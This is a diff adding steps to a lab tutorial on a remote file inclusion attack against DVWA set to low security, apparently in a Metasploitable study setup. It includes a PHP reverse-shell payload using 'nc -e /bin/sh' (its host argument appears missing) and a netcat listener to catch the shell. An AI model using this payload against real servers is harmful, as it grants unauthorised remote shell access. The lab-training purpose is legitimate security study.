@@ -119,8 +119,24 @@ sudo /etc/init.d/apache2 restart
 ```
 - ![image](https://github.com/stellados53/vulnerabilities-Metasploitable-/assets/142677726/a815f59d-b4a3-4b53-aa9b-41bc7fdaf015)
 - FINISHED!!
-
-
-
+- Now open the kali linux and create a file. that should contain the following content
+```
+<?php
+passthru("nc -e /bin/sh 8080");
+?>
+```
+![image](https://github.com/stellados53/vulnerabilities-Metasploitable-/assets/142677726/e3e8e25e-d396-4110-a989-0c7383164e5d)
+- now save the file in the `/var/www/html/` location.
+- open terminal and DVWA website set it as low and open file inclusion.
+- make sure that the apache2 is already installed. To check the status run..`sudo service apache2 status`. make sure that the they __active(running)__ and __enabled__.
+- ![image](https://github.com/stellados53/vulnerabilities-Metasploitable-/assets/142677726/2b7f42f2-0d66-4535-a411-4ac3de4f7b4c)
+- If not, To start the apache2 server run the command `sudo service apache2 start`.
+- Now open the webbrowser and try to access the file in webbrowser.
+- ![image](https://github.com/stellados53/vulnerabilities-Metasploitable-/assets/142677726/f16a0ddb-eeac-4750-981f-0170a66348e0)
+- now copy the url and paste it from the `?page=`..remove`include.php`. this looks like..
+- ![image](https://github.com/stellados53/vulnerabilities-Metasploitable-/assets/142677726/8edf1c00-e4ca-4e74-afea-dfff1cdf1dc7)
+- now open the terminal and run `nc -vv -l -p 8080` to recieve the reverse connection.
+- as we click enter in the webbrowser. this makes the connection in the command terminal with the webbrowser.
+- ![Screenshot 2024-04-20 162650](https://github.com/stellados53/vulnerabilities-Metasploitable-/assets/142677726/edebbc23-9355-4bfa-97a2-c8335a10cc3c)
 
 
